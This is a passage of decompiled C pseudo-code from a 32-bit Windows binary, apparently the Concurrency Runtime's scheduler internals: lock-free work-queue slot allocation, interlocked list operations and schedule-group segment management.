    while ( v3 );
  }
  j_j_j___free_base(*(void **)(this + 8));
}

//----- (0047F1E5) --------------------------------------------------------
void __thiscall sub_47F1E5(signed __int32 this)
{
  int v2; // eax

  v2 = *(_DWORD *)(this + 12) & 0xFFFFFFF;
  *(_DWORD *)this = &Concurrency::details::ScheduleGroupSegmentBase::`vftable';
  if ( v2 == 3 )
    sub_47F65C(*(_DWORD **)(*(_DWORD *)(this + 256) + 4), *(_DWORD *)(this + 36), this);
  sub_47F08B((PSLIST_HEADER)(this + 168));
  sub_47F105((PSLIST_HEADER)(this + 88));
  sub_47F181(this + 52);
  j_j_j___free_base(*(void **)(this + 32));
}
// 4C1300: using guessed type void *Concurrency::details::ScheduleGroupSegmentBase::`vftable';

//----- (0047F233) --------------------------------------------------------
void **__thiscall sub_47F233(void **this, void **a2)
{
  void **result; // eax

  j_j_j___free_base(this[1]);
  *this = *a2;
  this[1] = a2[1];
  result = this;
  *a2 = 0;
  a2[1] = 0;
  return result;
}

//----- (0047F25D) --------------------------------------------------------
void *__thiscall sub_47F25D(void *this, char a2)
{
  sub_47F1E5((signed __int32)this);
  if ( (a2 & 1) != 0 )
    sub_46C87D(this);
  return this;
}

//----- (0047F282) --------------------------------------------------------
int __thiscall sub_47F282(int this, int *a2)
{
  int v3; // edi
  int v4; // ebx
  volatile signed __int32 *v5; // edx
  volatile signed __int32 *v6; // eax
  signed __int32 v7; // edx
  int v8; // eax
  volatile signed __int32 *v9; // edi
  signed __int32 v10; // eax
  volatile __int32 *v11; // edi
  _DWORD *v12; // eax
  int *v13; // ecx
  int v14; // eax
  signed __int32 v15; // eax
  int v16; // edx
  size_t v18; // [esp-8h] [ebp-38h]
  char v19[8]; // [esp+Ch] [ebp-24h] BYREF
  int v20; // [esp+14h] [ebp-1Ch]
  int (*v21)(); // [esp+18h] [ebp-18h]
  _DWORD *v22; // [esp+1Ch] [ebp-14h]
  int *v23; // [esp+20h] [ebp-10h]
  volatile signed __int32 *v24; // [esp+24h] [ebp-Ch]
  int *v25; // [esp+28h] [ebp-8h]
  char v26; // [esp+2Fh] [ebp-1h]

  v26 = 0;
  v3 = 0;
  v25 = 0;
  v4 = *(_DWORD *)(this + 48);
  do
  {
    v5 = (volatile signed __int32 *)(v4 + 8);
    if ( *(int *)(v4 + 8) < -1 )
      goto LABEL_9;
    v6 = *(volatile signed __int32 **)v4;
    v7 = 0;
    v24 = *(volatile signed __int32 **)v4;
    if ( *(int *)(this + 40) <= 0 )
    {
LABEL_8:
      v5 = (volatile signed __int32 *)(v4 + 8);
      goto LABEL_9;
    }
    while ( *v6 )
    {
LABEL_7:
      ++v7;
      v24 = ++v6;
      if ( v7 >= *(_DWORD *)(this + 40) )
        goto LABEL_8;
    }
    v8 = v7 + v3;
    v9 = v24;
    v23 = (int *)v8;
    *a2 = v8;
    v22 = *(_DWORD **)(this + 64);
    v10 = _InterlockedCompareExchange(v9, (signed __int32)a2, 0);
    v3 = (int)v25;
    if ( v10 )
    {
      v6 = v24;
      goto LABEL_7;
    }
    v3 = (int)v23;
    v26 = 1;
    v25 = v23;
    if ( (int)v23 >= (int)v22 )
      _InterlockedIncrement((volatile signed __int32 *)(this + 64));
    v15 = v7;
    v5 = (volatile signed __int32 *)(v4 + 8);
    _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -1, v15);
LABEL_9:
    if ( !v26 )
    {
      _InterlockedCompareExchange(v5, -2, -1);
      v25 = (int *)(*(_DWORD *)(this + 40) + v3);
      v11 = (volatile __int32 *)(v4 + 4);
      if ( !*(_DWORD *)(v4 + 4) && !_InterlockedCompareExchange(v11, 1, 0) )
      {
        v12 = (_DWORD *)unknown_libname_28((unsigned __int64)*(unsigned int *)(this + 40) >> 30 != 0 ? -1 : 4 * *(_DWORD *)(this + 40));
        v18 = 4 * *(_DWORD *)(this + 40);
        v22 = v12;
        memset(v12, 0, v18);
        v13 = (int *)operator new(0xCu);
        v23 = v13;
        if ( v13 )
        {
          v14 = (int)v22;
          v13[1] = 0;
          v13[2] = -1;
          *v13 = v14;
        }
        else
        {
          v13 = 0;
        }
        v16 = *(_DWORD *)(this + 60);
        if ( v16 < *(_DWORD *)(this + 56) )
        {
          *(_DWORD *)(*(_DWORD *)(this + 52) + 4 * v16) = v13;
          ++*(_DWORD *)(this + 60);
        }
        _InterlockedExchange(v11, (__int32)v13);
      }
      if ( *v11 == 1 )
      {
        v20 = 0;
        v21 = sub_46FD09;
        do
          sub_46E3D5((int)v19);
        while ( *v11 == 1 );
      }
    }
    v4 = *(_DWORD *)(v4 + 4);
    v3 = (int)v25;
  }
  while ( !v26 );
  return (int)v25;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);
// 47F282: using guessed type char var_24[8];

//----- (0047F3E3) --------------------------------------------------------
int __thiscall sub_47F3E3(int this, signed __int32 a2)
{
  int v3; // edi
  int v4; // ebx
  volatile signed __int32 *v5; // edx
  volatile signed __int32 *v6; // eax
  signed __int32 v7; // edx
  int v8; // eax
  volatile signed __int32 *v9; // edi
  signed __int32 v10; // eax
  volatile __int32 *v11; // edi
  _DWORD *v12; // eax
  int *v13; // ecx
  int v14; // eax
  signed __int32 v15; // eax
  int v16; // edx
  size_t v18; // [esp-8h] [ebp-38h]
  char v19[8]; // [esp+Ch] [ebp-24h] BYREF
  int v20; // [esp+14h] [ebp-1Ch]
  int (*v21)(); // [esp+18h] [ebp-18h]
  _DWORD *v22; // [esp+1Ch] [ebp-14h]
  int *v23; // [esp+20h] [ebp-10h]
  volatile signed __int32 *v24; // [esp+24h] [ebp-Ch]
  int *v25; // [esp+28h] [ebp-8h]
  char v26; // [esp+2Fh] [ebp-1h]

  v26 = 0;
  v3 = 0;
  v25 = 0;
  v4 = *(_DWORD *)(this + 48);
  do
  {
    v5 = (volatile signed __int32 *)(v4 + 8);
    if ( *(int *)(v4 + 8) < -1 )
      goto LABEL_9;
    v6 = *(volatile signed __int32 **)v4;
    v7 = 0;
    v24 = *(volatile signed __int32 **)v4;
    if ( *(int *)(this + 40) <= 0 )
    {
LABEL_8:
      v5 = (volatile signed __int32 *)(v4 + 8);
      goto LABEL_9;
    }
    while ( *v6 )
    {
LABEL_7:
      ++v7;
      v24 = ++v6;
      if ( v7 >= *(_DWORD *)(this + 40) )
        goto LABEL_8;
    }
    v8 = v7 + v3;
    v9 = v24;
    v23 = (int *)v8;
    *(_DWORD *)(a2 + 248) = v8;
    v22 = *(_DWORD **)(this + 64);
    v10 = _InterlockedCompareExchange(v9, a2, 0);
    v3 = (int)v25;
    if ( v10 )
    {
      v6 = v24;
      goto LABEL_7;
    }
    v3 = (int)v23;
    v26 = 1;
    v25 = v23;
    if ( (int)v23 >= (int)v22 )
      _InterlockedIncrement((volatile signed __int32 *)(this + 64));
    v15 = v7;
    v5 = (volatile signed __int32 *)(v4 + 8);
    _InterlockedCompareExchange((volatile signed __int32 *)(v4 + 8), -1, v15);
LABEL_9:
    if ( !v26 )
    {
      _InterlockedCompareExchange(v5, -2, -1);
      v25 = (int *)(*(_DWORD *)(this + 40) + v3);
      v11 = (volatile __int32 *)(v4 + 4);
      if ( !*(_DWORD *)(v4 + 4) && !_InterlockedCompareExchange(v11, 1, 0) )
      {
        v12 = (_DWORD *)unknown_libname_28((unsigned __int64)*(unsigned int *)(this + 40) >> 30 != 0 ? -1 : 4 * *(_DWORD *)(this + 40));
        v18 = 4 * *(_DWORD *)(this + 40);
        v22 = v12;
        memset(v12, 0, v18);
        v13 = (int *)operator new(0xCu);
        v23 = v13;
        if ( v13 )
        {
          v14 = (int)v22;
          v13[1] = 0;
          v13[2] = -1;
          *v13 = v14;
        }
        else
        {
          v13 = 0;
        }
        v16 = *(_DWORD *)(this + 60);
        if ( v16 < *(_DWORD *)(this + 56) )
        {
          *(_DWORD *)(*(_DWORD *)(this + 52) + 4 * v16) = v13;
          ++*(_DWORD *)(this + 60);
        }
        _InterlockedExchange(v11, (__int32)v13);
      }
      if ( *v11 == 1 )
      {
        v20 = 0;
        v21 = sub_46FD09;
        do
          sub_46E3D5((int)v19);
        while ( *v11 == 1 );
      }
    }
    v4 = *(_DWORD *)(v4 + 4);
    v3 = (int)v25;
  }
  while ( !v26 );
  return (int)v25;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 46D404: using guessed type int __cdecl unknown_libname_28(_DWORD);
// 47F3E3: using guessed type char var_24[8];

//----- (0047F548) --------------------------------------------------------
int __thiscall sub_47F548(_DWORD *this, int a2, int a3, int a4, int a5, int a6)
{
  _DWORD *v7; // eax
  int v8; // ebx
  unsigned __int8 (__thiscall *v9)(int, int, int, int, int, int); // esi
  int result; // eax
  int v11; // [esp-14h] [ebp-34h] BYREF
  int v12; // [esp-10h] [ebp-30h] BYREF
  int v13; // [esp-Ch] [ebp-2Ch]
  int v14; // [esp-8h] [ebp-28h]
  int v15; // [esp-4h] [ebp-24h]
  int v16[5]; // [esp+Ch] [ebp-14h] BYREF

  v7 = sub_475051();
  if ( !v7 || (_DWORD *)sub_406D60(v7) != this )
    *(_DWORD *)(a2 + 228) = 1;
  v8 = *(_DWORD *)(this[64] + 4);
  if ( *(int *)(v8 + 440) <= 0
    || (v9 = *(unsigned __int8 (__thiscall **)(int, int, int, int, int, int))(*(_DWORD *)v8 + 60),
        sub_4777A9(&v12, &a3),
        !v9(v8, a2, v12, v13, v14, v15)) )
  {
    (*(void (__thiscall **)(_DWORD *, int))(*this + 8))(this, a2);
    if ( (this[3] & 0xFFFFFFF) != 0 && sub_477ADC(&a3, this + 3) )
      (*(void (__thiscall **)(_DWORD *))(*this + 4))(this);
    if ( *(int *)(v8 + 436) > 0 )
    {
      sub_4777A9(v16, &a3);
      v15 = 11;
      sub_4777A9(&v11, v16);
      sub_477052((unsigned int *)v8, (int)this, v11, v12, v13, v14, v15);
    }
  }
  result = a2;
  *(_DWORD *)(a2 + 228) = 0;
  return result;
}
// 47F548: using guessed type int var_14[5];

//----- (0047F650) --------------------------------------------------------
char __cdecl sub_47F650(int a1)
{
  char result; // al

  result = sub_475B2C(*(_DWORD **)(a1 + 36));
  if ( !result )
  {
    sub_47F732(*(_DWORD **)(a1 + 16));
    *(_DWORD *)(a1 + 16) = 0;
    result = a1 + 72;
    _InterlockedExchange((volatile __int32 *)(a1 + 72), 0);
  }
  return result;
}

//----- (0047F65C) --------------------------------------------------------
signed __int32 __thiscall sub_47F65C(_DWORD *this, int a2, signed __int32 a3)
{
  signed __int32 result; // eax

  result = a3;
  if ( *(_DWORD *)((a2 << 7) + this[23]) == a3 )
    return _InterlockedCompareExchange((volatile signed __int32 *)((a2 << 7) + this[23]), 0, a3);
  return result;
}

//----- (0047F681) --------------------------------------------------------
int __thiscall sub_47F681(char *this, _DWORD *a2, int a3)
{
  int v3; // eax
  int *v4; // ebx
  bool v5; // zf
  union _SLIST_HEADER *v6; // eax
  PSLIST_ENTRY v7; // eax
  int v8; // esi

  v3 = *a2 & 0xFFFFFFF;
  v4 = (int *)&this[4 * (v3 == 0) + 12];
  v5 = v3 == 0;
  v6 = (union _SLIST_HEADER *)(a3 + 96);
  if ( !v5 )
    v6 = (union _SLIST_HEADER *)(a3 + 16);
  v7 = InterlockedPopEntrySList(v6);
  if ( !v7 || (v8 = (int)&v7[-72], v7 == (PSLIST_ENTRY)288) )
    v8 = (*(int (__thiscall **)(char *, int, _DWORD *))(*(_DWORD *)this + 32))(this, a3, a2);
  else
    sub_47FACE(v8, (int)this, a3, a2);
  *(_DWORD *)(v8 + 260) = *v4;
  *v4 = v8;
  if ( !*(_DWORD *)(a3 + 188) )
    sub_47ED0C((volatile __int32 *)a3);
  sub_47F3E3(a3 + ((*a2 & 0xFFFFFFF) != 0 ? 16 : 96), v8);
  return v8;
}

//----- (0047F732) --------------------------------------------------------
void __stdcall sub_47F732(_DWORD *a1)
{
  _DWORD *v2; // eax

  while ( a1 )
  {
    v2 = a1 - 1;
    a1 = (_DWORD *)*a1;
    sub_46C87D(v2);
  }
}

//----- (0047F753) --------------------------------------------------------
void __thiscall sub_47F753(_DWORD *this)
{
  volatile signed __int32 *v2; // edi
  _DWORD *v3; // eax
  _DWORD *v4; // eax
  char v5[8]; // [esp+10h] [ebp-20h] BYREF
  int v6; // [esp+18h] [ebp-18h]
  void (*v7)(); // [esp+1Ch] [ebp-14h]
  _DWORD *v8; // [esp+20h] [ebp-10h]
  int v9; // [esp+2Ch] [ebp-4h]

  v2 = this + 4;
  if ( !this[4] && !_InterlockedCompareExchange(v2, 1, 0) )
  {
    v3 = operator new(0x2Cu);
    v8 = v3;
    v9 = 0;
    if ( v3 )
      v4 = sub_47F01F(v3, *this, (int)(this + 1), this[3], 0);
    else
      v4 = 0;
    v9 = -1;
    *v2 = (volatile signed __int32)v4;
    this[5] = v4;
  }
  if ( !this[5] )
  {
    v6 = 0;
    v7 = sub_46FCCB;
    do
      sub_46E3D5((int)v5);
    while ( !this[5] );
  }
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);
// 47F753: using guessed type char var_20[8];

//----- (0047F7C9) --------------------------------------------------------
char __thiscall sub_47F7C9(volatile signed __int32 *this, _DWORD *a2)
{
  int v2; // ebx
  volatile signed __int32 *v3; // edx
  unsigned __int32 i; // esi
  signed __int32 v5; // eax
  _DWORD *v6; // ecx
  signed __int32 *v7; // eax
  signed __int32 v8; // edx
  _DWORD *v9; // edi
  int v10; // eax
  int v11; // esi
  char v12; // al
  int v14[2]; // [esp+Ch] [ebp-18h] BYREF
  volatile signed __int32 *v15; // [esp+14h] [ebp-10h]
  volatile signed __int32 *v16; // [esp+18h] [ebp-Ch]
  int v17; // [esp+1Ch] [ebp-8h]
  _DWORD *v18; // [esp+20h] [ebp-4h]

  v2 = (int)this;
  v15 = this;
  v3 = this + 6;
LABEL_2:
  for ( i = *v3; i != *(_DWORD *)(v2 + 28); i = v5 )
  {
    v5 = _InterlockedCompareExchange(v3, i + 1, i);
    if ( v5 == i )
    {
      v6 = sub_47FB65((int *)v2, i, 0);
      v7 = (signed __int32 *)(v2 + 20);
      v18 = v6;
      v16 = (volatile signed __int32 *)(v2 + 20);
      if ( v6 != *(_DWORD **)(v2 + 20) )
      {
        v8 = *v7;
        v9 = (_DWORD *)*v7;
        while ( 1 )
        {
          while ( !(*(_DWORD *)(v2 + 12) + v9[5]) )
            v9 = (_DWORD *)v9[6];
          if ( v9[4] <= *(_DWORD *)(v8 + 16) )
            break;
          v10 = _InterlockedCompareExchange(v16, (signed __int32)v9, v8);
          v2 = (int)v15;
          v17 = v10;
          if ( v10 == v8 )
          {
            while ( (_DWORD *)v10 != v9 )
            {
              sub_48009C(v10, *(_DWORD *)(v2 + 12));
              v10 = *(_DWORD *)(v17 + 24);
              v17 = v10;
            }
            break;
          }
          v9 = (_DWORD *)v10;
          v8 = v10;
        }
        v6 = v18;
      }
      v11 = i - v6[4];
      v14[0] = (int)v6;
      v14[1] = v11;
      v12 = sub_477F29(v14, a2);
      v3 = (volatile signed __int32 *)(v2 + 24);
      if ( v12 )
        return 1;
      goto LABEL_2;
    }
  }
  return 0;
}

//----- (0047F88B) --------------------------------------------------------
int __thiscall sub_47F88B(int *this)
{
  _DWORD *v2; // esi
  int v3; // edi

  v2 = this + 2;
  sub_46FC7F(this + 2);
  v3 = sub_474F76(this);
  sub_46FCC0(v2);
  return v3;
}

//----- (0047F8BF) --------------------------------------------------------
int __thiscall sub_47F8BF(_DWORD *this, int a2)
{
  int v3; // eax

  v3 = this[64];
  if ( (*(_BYTE *)(v3 + 48) & 4) == 0 )
    _InterlockedIncrement((volatile signed __int32 *)(v3 + 20));
  sub_47FCE2(a2 + 76);
  _InterlockedExchange((volatile __int32 *)(a2 + 56), 1);
  return sub_47F282((int)(this + 42), (int *)(a2 + 44));
}

//----- (0047F8FE) --------------------------------------------------------
int __thiscall sub_47F8FE(int this, int a2)
{
  sub_46FC7F((volatile __int32 *)(this + 8));
  *(_DWORD *)(a2 + 12) = 0;
  **(_DWORD **)(this + 4) = a2;
  *(_DWORD *)(this + 4) = a2 + 12;
  return sub_46FCC0((_DWORD *)(this + 8));
}

//----- (0047F939) --------------------------------------------------------
_DWORD *__thiscall sub_47F939(char *this, _DWORD *a2, int a3)
{
  _DWORD *v3; // esi
  int v5[4]; // [esp+Ch] [ebp-10h] BYREF

  v3 = *(_DWORD **)&this[((*a2 & 0xFFFFFFF) != 0 ? 0xFFFFFFFC : 0) + 16];
  sub_47D370(*(int **)(a3 + 4), v5);
  while ( v3 && (!sub_477ADC(v3 + 3, a2) || v3[2] != a3) )
    v3 = (_DWORD *)v3[65];
  return v3;
}
// 47F939: using guessed type int var_10[4];

//----- (0047F98D) --------------------------------------------------------
int __thiscall sub_47F98D(union _SLIST_HEADER *this)
{
  int v2; // esi
  int Next; // ebx
  int v4; // eax
  int v6; // esi
  int v7; // [esp+Ch] [ebp-4h]

  v2 = 0;
  Next = (int)this[29].Next.Next;
  if ( Next <= 0 )
    return 0;
  while ( 1 )
  {
    v4 = sub_4743F9(&this[21], v2);
    v7 = v4;
    if ( v4 )
    {
      if ( sub_47FD54(this + 21, v4, v2, 0) )
        break;
    }
    if ( ++v2 >= Next )
      return 0;
  }
  v6 = *(_DWORD *)(v7 + 8);
  _InterlockedExchange((volatile __int32 *)(v6 + 56), 0);
  sub_476159(this[32].Next.Next);
  return v6;
}

//----- (0047F9F2) --------------------------------------------------------
int __thiscall sub_47F9F2(_DWORD *this, int a2, char a3)
{
  int v4; // eax
  int v5; // esi

  v4 = sub_47569E(*(_DWORD *)(this[64] + 4), 1);
  v5 = v4;
  if ( v4 )
    sub_47E2E2(v4, (int)this, a2, a3);
  return v5;
}

//----- (0047FA25) --------------------------------------------------------
int __thiscall sub_47FA25(int *this)
{
  int *v1; // ecx

  v1 = this + 10;
  if ( *v1 )
    return sub_47F88B(v1);
  else
    return 0;
}

//----- (0047FA35) --------------------------------------------------------
_DWORD *__thiscall sub_47FA35(int *this, int a2)
{
  _DWORD *v3; // ecx
  _DWORD *result; // eax

  v3 = operator new(0x2Cu);
  result = 0;
  if ( v3 )
    result = sub_47F01F(v3, *this, (int)(this + 1), this[3], this[3] + *(_DWORD *)(a2 + 16));
  this[4] = (int)result;
  *(_DWORD *)(a2 + 24) = result;
  return result;
}
// 46C4D2: using guessed type void *__cdecl operator new(size_t Size);

//----- (0047FA7F) --------------------------------------------------------
bool __thiscall sub_47FA7F(_DWORD *this)
{
  return this[10] != 0;
}

//----- (0047FA87) --------------------------------------------------------
bool __thiscall sub_47FA87(void *this)
{
  return sub_47FC89((int)this) != 0;
}

//----- (0047FA92) --------------------------------------------------------
int __thiscall sub_47FA92(_DWORD *this, int a2)
{
  int result; // eax

  result = sub_474E2B((int)(this + 1), a2);
  if ( this[5] )
    return sub_474E2B(this[5] + 4, a2);
  return result;
}

//----- (0047FABB) --------------------------------------------------------
int __thiscall sub_47FABB(int *this, _DWORD *a2)
{
  this[5] = 1;
  return sub_4777A9(this + 8, a2);
}

//----- (0047FACE) --------------------------------------------------------
int __thiscall sub_47FACE(int this, int a2, int a3, _DWORD *a4)
{
  void **v5; // eax
  void *v7[2]; // [esp+Ch] [ebp-8h] BYREF

  *(_DWORD *)(this + 256) = a2;
  *(_DWORD *)(this + 8) = a3;
  sub_4777A9((int *)(this + 12), a4);
  *(_DWORD *)(this + 272) = 0;
  *(_DWORD *)(this + 284) = 1;
  v5 = (void **)sub_4754EB(*(unsigned int **)(a2 + 4), v7, a4);
  sub_47F233((void **)(this + 28), v5);
  j_j_j___free_base(v7[1]);
  if ( (*a4 & 0xFFFFFFF) == 3 )
    *(_DWORD *)(this + 36) = sub_47C620(*(unsigned int **)(a2 + 4), a4[2]);
  return sub_47FA92((_DWORD *)(this + 52), this + 28);
}

//----- (0047FB50) --------------------------------------------------------
bool __thiscall sub_47FB50(_DWORD *this)
{
  return this[1] <= *this && this[20] <= this[19];
}

//----- (0047FB65) --------------------------------------------------------
_DWORD *__thiscall sub_47FB65(int *this, unsigned int a2, char a3)
{
  _DWORD *v4; // ecx
  int v5; // edx

  if ( !this[5] )
    sub_47F753(this);
  if ( a3 )
    v4 = (_DWORD *)this[4];
  else
    v4 = (_DWORD *)this[5];
  while ( 1 )
  {
    v5 = (int)v4;
    if ( a2 < this[3] + v4[4] )
      break;
    v4 = (_DWORD *)v4[6];
    if ( !v4 )
    {
      v4 = sub_47FA35(this, v5);
      if ( !v4 )
        break;
    }
  }
  return v4;
}

//----- (0047FBAD) --------------------------------------------------------
int __thiscall sub_47FBAD(int this, int *a2, char a3)
{
  int v4; // eax
  int v5; // ebx
  int v6; // esi
  char i; // al
  int *v8; // eax
  int *v9; // eax
  int result; // eax
  int v11[4]; // [esp+Ch] [ebp-30h] BYREF
  int v12[4]; // [esp+1Ch] [ebp-20h] BYREF
  int v13[4]; // [esp+2Ch] [ebp-10h] BYREF

  v4 = sub_4751F5(*(void **)(this + 4));
  if ( v4 )
    v5 = *(_DWORD *)(v4 + 4);
  else
    v5 = sub_475884(*(_DWORD **)(this + 4));
  sub_47D370(*(int **)(v5 + 4), v12);
  v6 = v5;
  memset(v13, 0, sizeof(v13));
  for ( i = sub_481D94((int)v12, a2); !i; i = sub_481D94((int)v12, v9) )
  {
    v5 = sub_475859(*(_DWORD **)(this + 4), 0, v5);
    v8 = sub_47D370(*(int **)(v5 + 4), v11);
    sub_4777A9(v12, v8);
    if ( v5 == v6 )
    {
      v9 = v13;
      a2 = v13;
    }
    else
    {
      v9 = a2;
    }
  }
  result = (*(int (__thiscall **)(int, int *, int))(*(_DWORD *)this + 36))(this, a2, v5);
  if ( !result && a3 )
  {
    sub_46FC8F((volatile __int32 *)(this + 8));
    result = (*(int (__thiscall **)(int, int *, int))(*(_DWORD *)this + 36))(this, a2, v5);
    if ( !result )
      result = sub_47F681((char *)this, a2, v5);
    *(_DWORD *)(this + 8) = 0;
  }
  return result;
}
// 47FBAD: using guessed type int var_20[4];
// 47FBAD: using guessed type int var_30[4];

//----- (0047FC89) --------------------------------------------------------
int *__thiscall sub_47FC89(int this)
{
  int i; // edi
  int *result; // eax

  for ( i = 0; i < *(_DWORD *)(this + 152); ++i )
  {
    result = (int *)sub_4743F9((_DWORD *)(this + 88), i);
    if ( result )
    {
      if ( result[1] > *result || result[20] > result[19] )
        return result;
      if ( result[14] == 1 )
        sub_47FECE((union _SLIST_HEADER *)this, result);
    }
  }
  return (int *)(*(_DWORD *)(this + 76) != *(_DWORD *)(this + 80));
}

//----- (0047FCE2) --------------------------------------------------------
int __thiscall sub_47FCE2(int this)
{
  volatile __int32 *v2; // esi
  int v3; // eax

  v2 = *(volatile __int32 **)(this + 16);
  sub_46FC7F(v2);
  v3 = *(_DWORD *)(this + 4);
  *(_BYTE *)(this + 20) = 1;
  *(_DWORD *)(this + 24) = v3;
  return sub_46FCC0(v2);
}

//----- (0047FD15) --------------------------------------------------------
int __thiscall sub_47FD15(void *this, int a2)
{
  return sub_47F282((int)this + 168, (int *)(a2 + 44));
}

//----- (0047FD2E) --------------------------------------------------------
PSLIST_ENTRY __thiscall sub_47FD2E(_DWORD *this, struct _SINGLE_LIST_ENTRY *a2)
{
  sub_47E415((int)a2);
  return sub_476924(*(_DWORD *)(this[64] + 4), a2, 0);
}

//----- (0047FD54) --------------------------------------------------------
char __thiscall sub_47FD54(PSLIST_HEADER ListHead, signed __int32 a2, int a3, char a4)
{
  int v5; // eax
  int v6; // ebx
  struct _SINGLE_LIST_ENTRY *Next; // ecx
  int v8; // edi
  int v9; // eax
  int v10; // edi
  int v11; // eax
  USHORT DepthSList; // ax
  struct _SINGLE_LIST_ENTRY *v13; // eax
  struct _SINGLE_LIST_ENTRY *v15; // [esp-4h] [ebp-18h]
  int v16; // [esp-4h] [ebp-18h]

  v5 = a3 >> *(_DWORD *)&ListHead[5].Depth;
  v6 = a3 & ((int)&ListHead[5].Next.Next[-1].Next + 3);
  if ( v5 >= *(_DWORD *)&ListHead[7].Depth )
    return 0;
  Next = ListHead[7].Next.Next;
  v8 = *(_DWORD *)&ListHead[6].Depth;
  if ( v5 < (int)Next )
  {
    v10 = *(_DWORD *)(v8 + 4 * v5);
  }
  else
  {
    v9 = v5 - (_DWORD)Next;
    v10 = *(_DWORD *)(v8 + 4 * (_DWORD)Next - 4);
    if ( v9 >= 0 )
    {
      v11 = v9 + 1;
      do
      {
        v10 = *(_DWORD *)(v10 + 4);
        --v11;
      }
      while ( v11 );
    }
  }
  if ( _InterlockedCompareExchange((volatile signed __int32 *)(*(_DWORD *)v10 + 4 * v6), 0, a2) != a2 )
    return 0;
  _InterlockedCompareExchange((volatile signed __int32 *)(v10 + 8), v6, -2);
  if ( a4 )
  {
    DepthSList = QueryDepthSList(ListHead);
    v15 = (struct _SINGLE_LIST_ENTRY *)(a2 + 4);
    if ( DepthSList <= *(int *)&ListHead[8].Depth )
    {
      InterlockedPushEntrySList(ListHead, v15);
    }
    else
    {
      InterlockedPushEntrySList(ListHead + 1, v15);
      if ( QueryDepthSList(ListHead + 1) > *(int *)&ListHead[8].Depth
        && !sub_475B2C(*(_DWORD **)&ListHead[4].Depth)
        && !_InterlockedCompareExchange((volatile signed __int32 *)&ListHead[9], 1, 0) )
      {
        v13 = InterlockedFlushSList(ListHead + 1);
        v16 = *(_DWORD *)&ListHead[4].Depth;
        ListHead[2].Next.Next = v13;
        sub_4761CF(
          (int (__cdecl **)(int))&ListHead[2].Depth,
          (int (__cdecl *)(int))sub_47F650,
          (int (__cdecl *)(int))ListHead,
          v16);
      }
    }
  }
  return 1;
}

//----- (0047FE45) --------------------------------------------------------
char __thiscall sub_47FE45(signed __int32 this)
{
  sub_476CEA(*(_DWORD *)(*(_DWORD *)(this + 256) + 4), this + 272);
  return sub_47EE5F(*(char **)(this + 8), this);
}

//----- (0047FE68) --------------------------------------------------------
char __thiscall sub_47FE68(_DWORD *this)
{
  signed __int32 v2; // ecx
  signed __int32 v3; // esi
  char result; // al
  signed __int32 v5; // ecx
  signed __int32 v6; // esi

  v2 = this[4];
  if ( v2 )
  {
    do
    {
      v3 = *(_DWORD *)(v2 + 260);
      result = sub_47FE45(v2);
      v2 = v3;
    }
    while ( v3 );
  }
  v5 = this[3];
  if ( v5 )
  {
    do
    {
      v6 = *(_DWORD *)(v5 + 260);
      result = sub_47FE45(v5);
      v5 = v6;
    }
    while ( v6 );
  }
  this[4] = 0;
  this[3] = 0;
  return result;
}

//----- (0047FEA7) --------------------------------------------------------
signed __int32 __thiscall sub_47FEA7(union _SLIST_HEADER *this, signed __int32 a2)
{
  sub_478609(this + 11, a2, *(_DWORD *)(a2 + 68), 1);
  return sub_476159(this[32].Next.Next);
}

//----- (0047FECE) --------------------------------------------------------
char __thiscall sub_47FECE(union _SLIST_HEADER *this, int *a2)
{
  if ( sub_47FD54(this + 21, (signed __int32)(a2 + 11), a2[11], 0) )
  {
    if ( a2[20] <= a2[19] )
    {
      sub_480E74((int)a2, (int)this);
      return 1;
    }
    sub_480E16((int)a2, (int)this);
  }
  return 0;
}

//----- (0047FF10) --------------------------------------------------------
int __thiscall sub_47FF10(void *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3, int a4)
{
  _DWORD *v4; // eax

  v4 = (_DWORD *)(*(int (__thiscall **)(void *, int, int))(*(_DWORD *)this + 20))(this, a4, 1);
  return sub_47FF68(v4, a2, a3);
}

//----- (0047FF40) --------------------------------------------------------
int __thiscall sub_47FF40(void *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3)
{
  _DWORD *v3; // eax

  v3 = (_DWORD *)(*(int (__thiscall **)(void *, int, int))(*(_DWORD *)this + 20))(this, (int)this + 32, 1);
  return sub_47FF68(v3, a2, a3);
}

//----- (0047FF68) --------------------------------------------------------
int __thiscall sub_47FF68(_DWORD *this, struct _SINGLE_LIST_ENTRY *a2, struct _SINGLE_LIST_ENTRY *a3)
{
  int v4; // eax
  int v5; // edi
  int v6; // eax
  int v7; // ecx
  _DWORD *v8; // eax
  _DWORD *v9; // esi
  int v10; // eax
  int *v11; // esi
  _DWORD *v12; // edx
  int result; // eax
  int (__thiscall *v14)(int, _DWORD *, int, int, struct _SINGLE_LIST_ENTRY *, struct _SINGLE_LIST_ENTRY *); // esi
  int v15[2]; // [esp-10h] [ebp-2Ch] BYREF
  struct _SINGLE_LIST_ENTRY *v16; // [esp-8h] [ebp-24h]
  struct _SINGLE_LIST_ENTRY *v17; // [esp-4h] [ebp-20h]
  char pExceptionObject[12]; // [esp+Ch] [ebp-10h] BYREF
  int *v19; // [esp+18h] [ebp-4h]

  if ( !a2 )
  {
    sub_46A08B(pExceptionObject, (int)"proc");
    _CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  v4 = this[64];
  v17 = a3;
  v16 = a2;
  v5 = *(_DWORD *)(v4 + 4);
  v6 = sub_475912((union _SLIST_HEADER *)v5, a2, a3);
  v7 = this[64];
  if ( (*(_BYTE *)(v7 + 48) & 4) == 0 )
    _InterlockedIncrement((volatile signed __int32 *)(v7 + 20));
  sub_47F8FE((int)(this + 10), v6);
  v8 = sub_475051();
  v9 = v8;
  if ( v8 && sub_406D70(v8) == v5 )
  {
    v10 = v9[39];
    if ( *((_BYTE *)v9 + 76) )
      ++*(_DWORD *)(v10 + 8);
    else
      ++*(_DWORD *)(v10 + 104);
  }
  else
  {
    v11 = (int *)sub_46F930(*(_DWORD *)(v5 + 24));
    if ( !v11 )
    {
      v11 = (int *)operator new(0x1Cu);
      v19 = v11;
      if ( v11 )
      {
        v11[2] = 0;
        v11[3] = 0;
        v11[4] = 0;
        v11[5] = 0;
